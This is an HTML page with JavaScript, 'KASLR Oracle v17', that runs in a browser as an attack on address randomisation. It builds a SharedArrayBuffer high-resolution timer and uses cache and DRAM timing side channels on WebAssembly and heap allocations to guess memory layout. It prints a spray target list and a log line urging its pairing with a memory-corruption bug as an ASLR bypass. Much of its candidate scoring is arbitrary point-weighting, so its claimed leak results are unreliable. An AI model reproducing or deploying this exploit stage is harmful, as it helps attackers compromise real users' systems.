<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>KASLR Oracle v17</title></head>
<body>
<pre id="log"></pre>
<script>
// timer-kaslr-v17
//
// v16 failure: per-pass entropy recomputation.
//   Pass 1: T4 fallback 60MB → 4 clusters → leaked=10 → 512 candidates
//   Pass 2: fresh allocs all land in DRAM (30-99ns, 1 cluster) → leaked=4 → 32768 candidates
//   Pass 3: same → 32768 candidates
//   Intersection of different-sized candidate spaces = 0 → fallback → 12631 garbage.
//
// v17 fix: FIXED CANDIDATE SPACE
//   1. T3 + T4 run once to establish global entropy → fixed 512-candidate space.
//   2. Run 3 bank-collection passes (fresh anchors+bufs each time).
//   3. Each pass scores ALL 512 candidates using bank pairs.
//   4. ACCUMULATE bank evidence per alloc ID across passes:
//      - alloc that bank-matches anc0 in 2/3 passes → confirmed match
//      - alloc that only matches in 1/3 passes → noise
//   5. Score 512 candidates using confirmed matches (higher weight for multi-pass matches).
//   6. Output HIGH set from accumulated score.
//
// Result: even if each pass gives only 7-17 pairs, 3 passes with
//         cross-pass confirmation filter removes noise → tighter scoring.
//
// Key insight: bank evidence accumulation is independent of T4 spread.
//   T4 gives cluster bits. Bank pairs give PA position bits.
//   These are ADDITIVE — accumulate separately, combine at T10.

const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

let counterWorker = null;
let counterView   = null;
let NS = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while (true) Atomics.add(c, 0, 1);
    }
  };
`;

async function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
  w.postMessage({cmd:'start', sab});
  counterWorker = w;
  await new Promise(r=>setTimeout(r,200));
}
const rdcnt = () => Atomics.load(counterView, 0);

function buildChase(sizeBytes) {
  const LINE = 64;
  const entries = Math.floor(sizeBytes / LINE);
  const arr = new Int32Array(entries * 16);
  const order = new Int32Array(entries);
  for (let i = 0; i < entries; i++) order[i] = i;
  for (let i = entries-1; i > 0; i--) {
    const j = (Math.random() * (i+1)) | 0;
    const t = order[i]; order[i] = order[j]; order[j] = t;
  }
  for (let i = 0; i < entries; i++) arr[order[i]*16] = order[(i+1)%entries];
  let s=0; for(let i=0;i<arr.length;i+=16) s+=arr[i]; arr[0]^=s&0;
  let idx=0; for(let i=0;i<entries;i++) idx=arr[idx*16]; arr[0]^=idx&0;
  return { arr, entries };
}

function chaseTime(arr, startIdx, steps) {
  const t0 = rdcnt();
  let idx = startIdx;
  for (let i = 0; i < steps; i++) idx = arr[idx * 16];
  return (rdcnt() - t0 + (idx & 0)) / steps;
}

function evictFull(chase) {
  let idx=0;
  for(let p=0;p<2;p++)
    for(let i=0;i<chase.entries;i++) idx=chase.arr[idx*16];
  chase.arr[0]^=idx&0;
}

function selfEvict(bufs) {
  let idx=0;
  for(const b of bufs){
    for(let p=0;p<1;p++)
      for(let i=0;i<b.ch.entries;i++) idx=b.ch.arr[idx*16];
  }
  if(bufs.length>0) bufs[0].ch.arr[0]^=idx&0;
}

function clusterMedians(medians){
  const clusters=[];
  let cur=[medians[0]];
  for(let i=1;i<medians.length;i++){
    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>15){
      clusters.push([...cur]); cur=[medians[i]];
    } else cur.push(medians[i]);
  }
  clusters.push(cur);
  return clusters;
}

// ─────────────────────────────────────────────────────────────
// T1: Calibrate
// ─────────────────────────────────────────────────────────────
async function t1() {
  log('─── T1: Calibrate ───');
  const w0=performance.now(), c0=rdcnt();
  await new Promise(r=>setTimeout(r,50));
  const c1=rdcnt(), w1=performance.now();
  NS=(w1-w0)*1e6/(c1-c0);
  log(`[*] T1 ${(c1-c0)} counts / ${(w1-w0).toFixed(1)}ms = ${NS.toFixed(3)}ns/count`);
  log(`[*] T1 L1≈5ns=${(5/NS).toFixed(1)}cts  L3≈30ns=${(30/NS).toFixed(1)}cts  DRAM≈130ns=${(130/NS).toFixed(1)}cts`);
}

// ─────────────────────────────────────────────────────────────
// T2: DRAM signal confirm
// ─────────────────────────────────────────────────────────────
async function t2() {
  log('─── T2: DRAM signal confirm ───');
  const hot  = buildChase(4*1024);
  const cold = buildChase(32*1024*1024);
  await new Promise(r=>setTimeout(r,50));
  const STEPS=64, REPS=40;
  let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
  const hotT=[], coldT=[];
  for(let r=0;r<REPS;r++){
    hotT.push(chaseTime(hot.arr,0,STEPS));
    coldT.push(chaseTime(cold.arr,r%cold.entries,STEPS));
  }
  hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
  const hp50=hotT[20]*NS, cp50=coldT[20]*NS;
  log(`[*] T2 hot p50=${hp50.toFixed(1)}ns  cold p50=${cp50.toFixed(1)}ns  ratio=${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  if(cp50>hp50*3&&cp50>30) log(`[!!!] T2 DRAM signal confirmed: ${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  return { hasDRAM:cp50>30, dramNS:cp50, hotNS:hp50 };
}

// ─────────────────────────────────────────────────────────────
// T3: Wasm JIT (once — stable per session)
// ─────────────────────────────────────────────────────────────
async function t3() {
  log('─── T3: Wasm JIT (96 modules) ───');
  const makeWasm = (lo, hi) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x0c,0x01,0x0a,0x00,
    0x20,0x00,0x41,lo&0x7f,0x6a,0x41,hi&0x7f,0x6a,0x0b,
  ]);
  try {
    const test=await WebAssembly.instantiate(makeWasm(1,2));
    if(test.instance.exports.call(10)!==13){ log('[!] T3 binary fail'); return null; }
  } catch(e){ log(`[!] T3: ${e.message}`); return null; }

  const N=96, fns=[];
  for(let i=0;i<N;i++){
    try {
      const inst=await WebAssembly.instantiate(makeWasm(i&0x7f,(i*7)&0x7f));
      fns.push({fn:inst.instance.exports.call, id:i});
    } catch(e){}
  }
  log(`[*] T3 compiled ${fns.length}/${N}`);
  if(!fns.length) return null;

  log(`[*] T3 building evictA (24MB)...`);
  const evictA = buildChase(24*1024*1024);
  await new Promise(r=>setTimeout(r,30));
  for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }

  const BATCH=64, ROUNDS=8;
  const coldReps=Array.from({length:N},()=>[]);
  const hotAcc=new Array(N).fill(0);

  log(`[*] T3 running ${ROUNDS} rounds...`);
  for(let round=0;round<ROUNDS;round++){
    evictFull(evictA);
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      coldReps[id].push((rdcnt()-t0+(x&0))/BATCH*NS);
    }
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      hotAcc[id]+=(rdcnt()-t0+(x&0))/BATCH;
    }
  }

  const results=fns.map(({id})=>{
    const rs=[...coldReps[id]].sort((a,b)=>a-b);
    const p25=rs[Math.floor(rs.length*0.25)];
    const mean=rs.reduce((a,b)=>a+b,0)/rs.length;
    const std=Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
    return {id, cold:p25, hot:hotAcc[id]/ROUNDS*NS, cv:std/Math.max(mean,0.1)};
  });
  results.sort((a,b)=>b.cold-a.cold);
  const cMin=Math.min(...results.map(r=>r.cold));
  const cMax=Math.max(...results.map(r=>r.cold));
  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns`);
  const slcHot=results.filter(r=>r.cold<40);
  const dramCold=results.filter(r=>r.cold>=40);
  log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
  if(slcHot.length&&dramCold.length) log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC + ${dramCold.length} DRAM`);
  return {results, slcHot, dramCold, evictA};
}

// ─────────────────────────────────────────────────────────────
// T4: Heap fingerprint (once — establishes global entropy)
// ─────────────────────────────────────────────────────────────
async function t4() {
  log('─── T4: Heap fingerprint ───');
  const N=32, SZ=2*1024*1024, STEPS=64, REPS=20;
  log(`[*] T4 allocating ${N} × 2MB...`);
  const bufs=[];
  for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
  await new Promise(r=>setTimeout(r,50));

  const timingSets=bufs.map(()=>[]);
  for(let rep=0;rep<REPS;rep++){
    if(rep>0&&rep%5===0) await new Promise(r=>setTimeout(r,0));
    selfEvict(bufs);
    let idx2=0;
    for(let i=bufs.length-1;i>=0;i--){
      for(let j=0;j<bufs[i].ch.entries;j+=Math.max(1,Math.floor(bufs[i].ch.entries/512)))
        idx2=bufs[i].ch.arr[idx2%bufs[i].ch.entries*16]||0;
    }
    bufs[0].ch.arr[0]^=idx2&0;
    for(let i=0;i<N;i++)
      timingSets[i].push(chaseTime(bufs[i].ch.arr,(rep*7)%bufs[i].ch.entries,STEPS));
  }

  let medians=timingSets.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
  medians.sort((a,b)=>a.ns-b.ns);
  const tMax=medians[medians.length-1].ns;

  if(tMax<10){
    log(`[!] T4 self-eviction gave all-0ns — trying 60MB external eviction`);
    const evictLarge=buildChase(60*1024*1024);
    await new Promise(r=>setTimeout(r,30));
    const ts2=bufs.map(()=>[]);
    for(let rep=0;rep<REPS;rep++){
      evictFull(evictLarge); evictFull(evictLarge); evictFull(evictLarge);
      for(let i=0;i<N;i++)
        ts2[i].push(chaseTime(bufs[i].ch.arr,(rep*7)%bufs[i].ch.entries,STEPS));
    }
    const med2=ts2.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
    med2.sort((a,b)=>a.ns-b.ns);
    if(med2[med2.length-1].ns>tMax){ medians=med2; log(`[*] T4 large-evict used`); }
  }

  const clusters=clusterMedians(medians);
  log(`[*] T4 spread: ${medians[0].ns.toFixed(1)}-${medians[medians.length-1].ns.toFixed(1)}ns`);
  log(`[*] T4 clusters (${clusters.length}): `+clusters.map((cl,ci)=>{
    const ns=cl.map(m=>m.ns);
    return `C${ci}:${cl.length}allocs(${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns)`;
  }).join(' | '));
  if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);

  return {medians, clusters, bufs};
}

// ─────────────────────────────────────────────────────────────
// T6: Global entropy (computed ONCE from T3+T4)
// ─────────────────────────────────────────────────────────────
function t6(jitData, heapData) {
  log('─── T6: Bit extraction + entropy (GLOBAL — fixed for all passes) ───');
  const dramCold=jitData.results.filter(r=>r.cold>=40);
  const numClusters=heapData.clusters.length;
  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
  const jitPartBit=(jitData.slcHot.length>0&&dramCold.length>0)?1:0;
  const heapMax=heapData.medians[heapData.medians.length-1].ns;
  const heapMin=heapData.medians[0].ns;
  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
  const aslrBits=19;
  const remaining=Math.max(0,aslrBits-totalLeaked);
  log(`[*] T6 page color: ${pageColorBits}b  JIT partition: ${jitPartBit}b  heap cluster: ${clusterBits}b`);
  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits → remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
  if(remaining<=12) log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates at 1ms/probe → ${((2**remaining)/1000).toFixed(3)}s`);
  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters,
    slcCount:jitData.slcHot.length, dramCount:jitData.dramCold.length};
}

// ─────────────────────────────────────────────────────────────
// BANK PASS: collect bank pairs from fresh anchors + existing bufs
// ─────────────────────────────────────────────────────────────
async function bankPass(passIdx, bufs, evictA) {
  log(`\n─── BANK PASS ${passIdx+1}/3 ───`);

  // Build fresh anchors each pass — anchor PA placement shifts
  const N_ANCHORS=4, ANCHOR_SZ=256*1024, ASTEPS=256, REPS_HOT=16, REPS_COLD=8;
  const anchors=[];
  for(let i=0;i<N_ANCHORS;i++) anchors.push({ch:buildChase(ANCHOR_SZ), id:i});
  await new Promise(r=>setTimeout(r,20));

  // Warm
  for(const a of anchors){
    let idx=0;
    for(let p=0;p<4;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }
  await new Promise(r=>setTimeout(r,10));

  // Hot measurement
  const hotNS=anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_HOT;r++) ts.push(chaseTime(a.ch.arr,0,ASTEPS)*NS);
    ts.sort((a,b)=>a-b);
    return Math.max(ts[Math.floor(ts.length*0.25)], 5.0);
  });

  // Re-warm
  for(const a of anchors){
    let idx=0;
    for(let p=0;p<2;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  // Cold validation
  const coldNS=anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_COLD;r++){
      evictFull(evictA); evictFull(evictA);
      const t0=rdcnt(); let idx=0;
      for(let s=0;s<ASTEPS;s++) idx=a.ch.arr[idx*16];
      ts.push((rdcnt()-t0+(idx&0))/ASTEPS*NS);
    }
    ts.sort((x,y)=>x-y);
    return ts[Math.floor(ts.length*0.25)];
  });

  const evictableAnchors=anchors.filter((_,i)=>coldNS[i]>hotNS[i]*2&&coldNS[i]>80);
  log(`[*] P${passIdx+1} anchors: ${evictableAnchors.length}/${N_ANCHORS} evictable`+
    anchors.map((a,i)=>`  anc${i}:${coldNS[i]>hotNS[i]*2&&coldNS[i]>80?coldNS[i].toFixed(0)+'ns✓':'✗'}`).join(''));

  const useAnchors=evictableAnchors.length>0?evictableAnchors:anchors;

  // T7x bank correlation
  const BASELINE_MIN_NS=60, CORR_THRESHOLD=1.3, BSTEPS=128, REPS_BASE=3, REPS_EVICT=6;
  const bankTable=[];
  const correlatedPairs=[];

  function warmAnchor(a){
    let idx=0;
    for(let p=0;p<3;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  const N=bufs.length;
  for(let i=0;i<N;i++){
    if(i>0&&i%2===0) await new Promise(r=>setTimeout(r,0));
    const buf=bufs[i];
    let allocBankScore=0, allocMaxEff=0;

    for(const anc of useAnchors){
      warmAnchor(anc);
      const bTs=[];
      for(let r=0;r<REPS_BASE;r++){
        evictFull(evictA);
        const t0=rdcnt(); let idx=0;
        for(let s=0;s<BSTEPS;s++) idx=anc.ch.arr[idx*16];
        bTs.push((rdcnt()-t0+(idx&0))/BSTEPS*NS);
      }
      bTs.sort((a,b)=>a-b);
      const freshBase=bTs[Math.floor(bTs.length*0.25)];
      if(freshBase<BASELINE_MIN_NS) continue;

      const eTs=[];
      for(let r=0;r<REPS_EVICT;r++){
        warmAnchor(anc);
        evictFull(buf.ch);
        evictFull(evictA);
        const t0=rdcnt(); let idx=0;
        for(let s=0;s<BSTEPS;s++) idx=anc.ch.arr[idx*16];
        eTs.push((rdcnt()-t0+(idx&0))/BSTEPS*NS);
      }
      eTs.sort((a,b)=>a-b);
      const postEvict=eTs[Math.floor(eTs.length*0.25)];
      const eff=postEvict/Math.max(freshBase,1);
      const correlated=eff>=CORR_THRESHOLD;
      if(correlated){
        correlatedPairs.push({allocId:buf.id, ancId:anc.id, eff, freshBase, postEvict});
        allocBankScore+=eff; allocMaxEff=Math.max(allocMaxEff,eff);
      }
    }
    bankTable.push({allocId:buf.id, allocBankScore, allocMaxEff});
  }

  log(`[*] P${passIdx+1} pairs: ${correlatedPairs.length}`);
  correlatedPairs.forEach(p=>{
    log(`[!!!] P${passIdx+1} BANK: alloc[${p.allocId}]↔anc${p.ancId} eff=${(p.eff*100).toFixed(0)}%`);
  });

  return {correlatedPairs, bankTable, passIdx};
}

// ─────────────────────────────────────────────────────────────
// T10: Score 512 candidates using ACCUMULATED evidence
// ─────────────────────────────────────────────────────────────
function t10(jitData, heapData, allPasses, entropyData) {
  log('\n─── T10: Candidate scorer (v17 — accumulated bank evidence) ───');

  const remaining=entropyData.remaining;
  const candidateCount=2**remaining;
  const PAGE_SIZE=16384;

  log(`[*] T10 scoring ${candidateCount} candidates (${remaining} bits remaining)`);
  log(`[*] T10 mode: ACCUMULATED bank evidence across ${allPasses.length} passes`);

  // Build accumulated evidence map:
  //   allocMatchCount[allocId][ancId] = number of passes where this pair was confirmed
  const allocMatchCount={};
  for(const pass of allPasses){
    for(const p of pass.correlatedPairs){
      if(!allocMatchCount[p.allocId]) allocMatchCount[p.allocId]={};
      allocMatchCount[p.allocId][p.ancId]=(allocMatchCount[p.allocId][p.ancId]||0)+1;
    }
  }

  // Build confirmed pairs: only those matching in ≥2 passes
  const confirmedPairs=[];
  const tentativePairs=[]; // matched in 1 pass only (lower weight)
  for(const [allocId, ancMap] of Object.entries(allocMatchCount)){
    for(const [ancId, count] of Object.entries(ancMap)){
      if(count>=2) confirmedPairs.push({allocId:parseInt(allocId), ancId:parseInt(ancId), count});
      else tentativePairs.push({allocId:parseInt(allocId), ancId:parseInt(ancId), count});
    }
  }

  log(`[*] T10 confirmed pairs (≥2/3 passes): ${confirmedPairs.length}`);
  log(`[*] T10 tentative pairs (1/3 passes): ${tentativePairs.length}`);
  confirmedPairs.forEach(p=>{
    log(`[*] T10   CONFIRMED: alloc[${p.allocId}]↔anc${p.ancId} (${p.count}/3 passes)`);
  });

  // Bank topology metrics from accumulated data
  const slcRatio=entropyData.slcCount/(entropyData.slcCount+entropyData.dramCount);
  const c0Size=heapData.clusters[0]?.length||0;
  const c0Ratio=c0Size/32;
  const heapSpread=heapData.medians[heapData.medians.length-1].ns;

  // Confirmed bank topology
  const hitAncs=[...new Set(confirmedPairs.map(p=>p.ancId))];
  const confirmedAllocIds=new Set(confirmedPairs.map(p=>p.allocId));
  const allBankAllocIds=new Set([...confirmedPairs,...tentativePairs].map(p=>p.allocId));

  // Multi-anchor confirmed allocs (strongest signal)
  const confirmedAncPerAlloc={};
  confirmedPairs.forEach(p=>{
    if(!confirmedAncPerAlloc[p.allocId]) confirmedAncPerAlloc[p.allocId]=new Set();
    confirmedAncPerAlloc[p.allocId].add(p.ancId);
  });
  const multiAnchorConfirmed=Object.values(confirmedAncPerAlloc).filter(s=>s.size>=2).length;
  const confirmedAllocList=[...confirmedAllocIds];

  // Accumulated bank score per alloc
  const accumBankScore={};
  for(const pass of allPasses){
    for(const b of pass.bankTable){
      accumBankScore[b.allocId]=(accumBankScore[b.allocId]||0)+b.allocBankScore;
    }
  }

  // Spearman: alloc index vs accumulated bank score (cross-pass)
  const scoredAllocData=Object.entries(accumBankScore).filter(([,v])=>v>0).map(([id,score])=>({allocId:parseInt(id),score}));
  let effHeapSpearman=0;
  if(scoredAllocData.length>=3){
    const byScore=[...scoredAllocData].sort((a,b)=>b.score-a.score);
    const byIndex=[...scoredAllocData].sort((a,b)=>a.allocId-b.allocId);
    const scoreRankMap={}, indexRankMap={};
    byScore.forEach((d,i)=>{ scoreRankMap[d.allocId]=i; });
    byIndex.forEach((d,i)=>{ indexRankMap[d.allocId]=i; });
    const n=scoredAllocData.length;
    let dSq=0;
    scoredAllocData.forEach(d=>{ const diff=scoreRankMap[d.allocId]-indexRankMap[d.allocId]; dSq+=diff*diff; });
    effHeapSpearman=1-(6*dSq)/(n*(n*n-1));
  }

  // Bank-weighted alloc index (PA position proxy)
  const totalAccumScore=scoredAllocData.reduce((a,b)=>a+b.score,0);
  const bankWeightedAllocIndex=totalAccumScore>0
    ? scoredAllocData.reduce((a,b)=>a+b.allocId*b.score,0)/totalAccumScore
    : NaN;

  // Max-eff alloc index
  const maxEffAllocEntry=scoredAllocData.reduce((a,b)=>a&&a.score>b.score?a:b,null);

  // Per-anchor group sizes from confirmed pairs
  const anchorGroupSizes=hitAncs.map(ancId=>confirmedPairs.filter(p=>p.ancId===ancId).length);

  log(`[*] T10 confirmed allocs: ${[...confirmedAllocIds].join(',')} multi-anc: ${multiAnchorConfirmed}`);
  log(`[*] T10 spearman(idx,accScore): ${effHeapSpearman.toFixed(3)}  bankWeightedIdx: ${isNaN(bankWeightedAllocIndex)?'N/A':bankWeightedAllocIndex.toFixed(1)}`);

  // Score all candidates
  const scores=[];
  const t4Failed=c0Ratio>=0.95;

  for(let c=0;c<candidateCount;c++){
    let score=50;
    const breakdown=[];
    const frac=c/candidateCount;

    // A: JIT SLC ratio
    const expectedHighSLC=frac<0.5;
    const observedHighSLC=slcRatio>0.6;
    if(expectedHighSLC===observedHighSLC){ score+=30; breakdown.push('JIT+30'); }
    else { score-=15; breakdown.push('JIT-15'); }

    if(!t4Failed){
      // B: Heap cluster spread
      const expectedLargeC0=frac<0.6;
      const observedLargeC0=c0Ratio>0.5;
      if(expectedLargeC0===observedLargeC0){ score+=25; breakdown.push('HEAP+25'); }
      else { score-=10; breakdown.push('HEAP-10'); }

      const expectedHighSpread=frac>0.3;
      if(expectedHighSpread===(heapSpread>500)){ score+=10; breakdown.push('SPREAD+10'); }
    }

    // C: Confirmed bank pairs credit (cross-pass verified)
    if(confirmedPairs.length>=3){ score+=25; breakdown.push('CBANK+25'); }
    else if(confirmedPairs.length>=1){ score+=15; breakdown.push('CBANK+15'); }
    else if(tentativePairs.length>0){ score+=5; breakdown.push('TBANK+5'); }
    else { score-=5; breakdown.push('BANK-5'); }

    // D: Multi-anchor confirmed allocs
    if(multiAnchorConfirmed>=2){ score+=25; breakdown.push('CMANC+25'); }
    else if(multiAnchorConfirmed>=1){ score+=15; breakdown.push('CMANC+15'); }
    else if(confirmedAllocIds.size>=2){ score+=10; breakdown.push('MANC+10'); }

    // E: Bank-weighted alloc index → anchor PA position
    if(!isNaN(bankWeightedAllocIndex)){
      const normIdx=bankWeightedAllocIndex/31.0;
      const expected=frac>normIdx*0.5&&frac<normIdx*0.5+0.5;
      if(expected){ score+=30; breakdown.push('IDX+30'); }
      else { score-=5; breakdown.push('IDX-5'); }
    }

    // F: Spearman correlation
    if(effHeapSpearman>0.4){
      if(frac>0.5){ score+=20; breakdown.push('SPEAR+20'); }
      else { score-=5; breakdown.push('SPEAR-5'); }
    } else if(effHeapSpearman<-0.4){
      if(frac<0.5){ score+=20; breakdown.push('SPEAR+20'); }
      else { score-=5; breakdown.push('SPEAR-5'); }
    } else if(Math.abs(effHeapSpearman)>0.2){ score+=10; breakdown.push('SPEAR+10'); }

    // G: Max-eff alloc index
    if(maxEffAllocEntry){
      const maxIdx=maxEffAllocEntry.allocId/31.0;
      if(Math.abs(frac-(0.3+maxIdx*0.5))<0.25){ score+=15; breakdown.push('MEFF+15'); }
    }

    // H: Per-anchor group size (confirmed pairs only)
    const maxGroupSize=Math.max(...anchorGroupSizes,0);
    if(maxGroupSize>=4){ score+=15; breakdown.push('GRP+15'); }
    else if(maxGroupSize>=2){ score+=8; breakdown.push('GRP+8'); }

    scores.push({c, score, va:`base+0x${(c*PAGE_SIZE).toString(16).toUpperCase().padStart(8,'0')}`, breakdown});
  }

  scores.sort((a,b)=>b.score-a.score||a.c-b.c);

  const scoreMap={};
  scores.forEach(s=>{ scoreMap[s.score]=(scoreMap[s.score]||0)+1; });
  const scoreKeys=Object.keys(scoreMap).map(Number).sort((a,b)=>b-a);
  log(`[*] T10 score distribution:`);
  scoreKeys.slice(0,8).forEach(k=>log(`[*] T10   score ${k}: ${scoreMap[k]} candidates`));

  log(`[*] T10 top-32 candidates:`);
  log(`[*] T10   rank  cand  score  VA-offset          breakdown`);
  scores.slice(0,32).forEach((s,i)=>{
    log(`[*] T10   ${String(i+1).padStart(4)}  0x${s.c.toString(16).padStart(4,'0')}  ${String(s.score).padStart(3)}    ${s.va}  [${s.breakdown.join('|')}]`);
  });

  const topScore=scores[0].score;
  const highConf=scores.filter(s=>s.score>=topScore-5);
  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
  const lowConf=scores.filter(s=>s.score<topScore-20);
  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);

  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length,128)).map(s=>s.c*PAGE_SIZE);
  sprayRaw.sort((a,b)=>a-b);
  const sprayFilled=[...sprayRaw];
  for(let i=0;i<sprayRaw.length-1;i++){
    if(sprayRaw[i+1]-sprayRaw[i]===2*PAGE_SIZE) sprayFilled.push(sprayRaw[i]+PAGE_SIZE);
  }
  sprayFilled.sort((a,b)=>a-b);
  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);

  log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
  for(let i=0;i<sprayHex.length;i+=8)
    log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);

  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v17) ===`);
  log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
  log(`[*] Confirmed pairs: ${confirmedPairs.length}  |  Tentative: ${tentativePairs.length}  |  Multi-anc confirmed: ${multiAnchorConfirmed}`);
  log(`[*] HIGH-confidence: ${highConf.length}  |  Spray count: ${sprayHex.length}`);
  log(`[*] Time to exhaust HIGH at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
  log(`[*] T10 === END ===`);

  return {scores, sprayHex, highConf, confirmedPairs, tentativePairs};
}

// ─────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────
(async()=>{
  log('// timer-kaslr-v17 ready (fixed candidate space + accumulated bank evidence)');
  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }

  await startCounter();
  await t1();
  await new Promise(r=>setTimeout(r,30));

  await t2();
  await new Promise(r=>setTimeout(r,30));

  const jitData=await t3();
  if(!jitData){ log('[!] T3 failed'); counterWorker.terminate(); return; }
  await new Promise(r=>setTimeout(r,30));

  // T4 once — establishes candidate space
  const heapData=await t4();
  await new Promise(r=>setTimeout(r,30));

  // T6 once — FIXED candidate count for all scoring
  const entropyData=t6(jitData,heapData);
  await new Promise(r=>setTimeout(r,30));

  // 3 bank collection passes using SAME heap bufs
  const allPasses=[];
  const NUM_PASSES=3;
  for(let p=0;p<NUM_PASSES;p++){
    if(p>0) await new Promise(r=>setTimeout(r,150));
    const passResult=await bankPass(p, heapData.bufs, jitData.evictA);
    allPasses.push(passResult);
  }

  await new Promise(r=>setTimeout(r,30));

  // T10: score using accumulated evidence
  await t10(jitData, heapData, allPasses, entropyData);

  counterWorker.terminate();

  const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
  hits.forEach(h=>log(h));
})();
